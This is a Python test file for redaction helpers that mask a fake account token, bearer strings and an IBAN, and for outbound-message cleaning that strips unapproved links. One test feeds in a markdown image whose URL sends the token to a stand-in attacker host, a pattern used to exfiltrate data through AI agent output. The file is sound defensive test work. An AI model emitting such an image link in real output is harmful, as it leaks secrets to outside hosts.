from app.redact import redact_text, redact_value, strip_unapproved_links
from app.tools.slack import clean_outbound

MARKER = "acct_tok_test_9f8e7d6c5b4a3210"


def test_secret_marker_removed_from_tool_output():
    out = redact_text(f"vendor portal token: {MARKER} expires tomorrow")
    assert MARKER not in out
    assert "[REDACTED:acct_token]" in out


def test_nested_payload_redacted():
    payload = {"error": f"auth failed for Bearer {'x' * 24}", "items": [MARKER]}
    out = redact_value(payload)
    assert "x" * 24 not in str(out)
    assert MARKER not in str(out)


def test_bank_account_keeps_last_four():
    out = redact_text("Remit to IBAN DE89370400440532013000 by Friday")
    assert "DE89370400440532013000" not in out
    assert out.endswith("3000] by Friday")


def test_markdown_image_with_data_is_removed():
    text = f"Done. ![status](https://collector.attacker.test/p.png?d={MARKER})"
    out = clean_outbound(text)
    assert "attacker.test" not in out
    assert MARKER not in out


def test_links_only_to_approved_hosts():
    out = strip_unapproved_links(
        "See [PO](https://erp.example-corp.test/po/42) and [this](https://evil.test/x) "
        "and <https://evil.test/y|here> and https://evil.test/z"
    )
    assert "https://erp.example-corp.test/po/42" in out
    assert "evil.test" not in out
